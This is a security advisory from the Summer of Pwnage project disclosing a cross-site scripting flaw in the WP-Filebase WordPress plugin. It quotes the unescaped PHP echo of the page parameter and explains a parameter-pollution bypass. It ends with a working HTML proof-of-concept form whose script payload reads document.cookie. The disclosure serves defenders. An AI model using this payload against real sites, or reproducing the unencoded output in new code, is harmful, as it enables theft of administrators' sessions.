------------------------------------------------------------------------
Cross-Site Scripting vulnerability in WP-Filebase Download Manager
WordPress Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the WP-Filebase
Download Manager WordPress Plugin. This issue allows an attacker to
perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf. In
order to exploit this issue, the attacker has to lure/force a logged on
WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0019

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on WP-Filebase Download Manager
WordPress Plugin version 3.4.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_wp_filebase_download_manager_wordpress_plugin.html

The issue exists in the file AdminGuiFiles.php and is caused by the lack of output encoding on the page request parameter. The vulnerable code is listed below.

<form id="posts-filter" action="" method="post">
<input type="hidden" name="page" value="<?php echo $_REQUEST['page'] ?>" />
<?php $file_table->display() ?>
</form>

Normally, the page URL parameter is validated by WordPress, which prevents Cross-Site Scripting. However in this case the value of page is obtained from $_REQUEST, not from $_GET. This allows for parameter pollution where the attacker puts a benign page value in the URL and simultaneously submits a malicious page value as POST parameter.

Proof of concept

<html>
   <body>
      <form action="http://<target>/wp-admin/admin.php?page=wpfilebase_files" method="POST">
         <input type="hidden" name="page" value="&quot;<script>alert(document.cookie);</script>" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>




------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
